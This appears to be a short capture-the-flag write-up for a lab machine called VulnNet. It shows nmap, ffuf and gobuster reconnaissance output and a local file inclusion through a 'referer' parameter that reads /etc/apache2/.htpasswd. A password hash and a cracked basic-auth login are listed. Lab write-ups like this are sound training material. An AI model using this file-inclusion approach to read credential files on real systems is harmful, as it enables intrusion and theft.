
First scan:

```
Starting Nmap 7.92 ( https://nmap.org ) at 2023-01-04 11:43 CET
Nmap scan report for 10.10.79.213
Host is up (0.029s latency).                                                                                                                                             
Not shown: 65533 closed tcp ports (reset)                                           
PORT   STATE SERVICE VERSION                                                        
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)                                                                                        
| ssh-hostkey: 
|   2048 ea:c9:e8:67:76:0a:3f:97:09:a7:d7:a6:63:ad:c1:2c (RSA)
|   256 0f:c8:f6:d3:8e:4c:ea:67:47:68:84:dc:1c:2b:2e:34 (ECDSA)
|_  256 05:53:99:fc:98:10:b5:c3:68:00:6c:29:41:da:a5:c9 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: VulnNet
|_http-server-header: Apache/2.4.29 (Ubuntu)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).

```

FFUF scan:
```
┌─[root@edu-virtualbox]─[/home/edu/THM/vulnnet]                                                                                                                  
└──╼ #ffuf -u http://vulnnet.thm -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H 'Host: FUZZ.vulnnet.thm' -fs 5829                            
________________________________________________                                                                                                                         
                                                                                                                                                                         
 :: Method           : GET                                                                                                                                               
 :: URL              : http://vulnnet.thm                                           
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt                                                                           
 :: Header           : Host: FUZZ.vulnnet.thm                                       
 :: Follow redirects : false                                                        
 :: Calibration      : false                                                        
 :: Timeout          : 10                                                           
 :: Threads          : 40                                                           
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500         
 :: Filter           : Response size: 5829                                          
________________________________________________                                                                                                                                                   
broadcast               [Status: 401, Size: 468, Words: 42, Lines: 15, Duration: 45ms]       
```

Gobuster:
```
┌─[root@edu-virtualbox]─[/home/edu/THM/vulnnet]
└──╼ #gobuster dir -u http://vulnnet.thm -x .html,.bak,.php,.txt -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://vulnnet.thm
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              txt,html,bak,php
[+] Timeout:                 10s
===============================================================
2023/01/04 16:16:59 Starting gobuster in directory enumeration mode
===============================================================
/index.php            (Status: 200) [Size: 5829]
/img                  (Status: 301) [Size: 308] [--> http://vulnnet.thm/img/]
/login.html           (Status: 200) [Size: 2479]                             
/css                  (Status: 301) [Size: 308] [--> http://vulnnet.thm/css/]
/js                   (Status: 301) [Size: 307] [--> http://vulnnet.thm/js/] 
/fonts                (Status: 301) [Size: 310] [--> http://vulnnet.thm/fonts/]
/LICENSE.txt          (Status: 200) [Size: 1109]                               
/server-status        (Status: 403) [Size: 276]                                
                                                                               
===============================================================
2023/01/04 17:03:59 Finished
===============================================================

```

LFI: `?referer=FILE`
Log file does not work, `/etc/apache2/.htpasswd` gives `developers:$apr1$ntOz2ERF$Sd6FT8YVTValWjL7bJv0P0`


##### Credentials
```
developers:9972761drmfsls   // http-basic-auth
```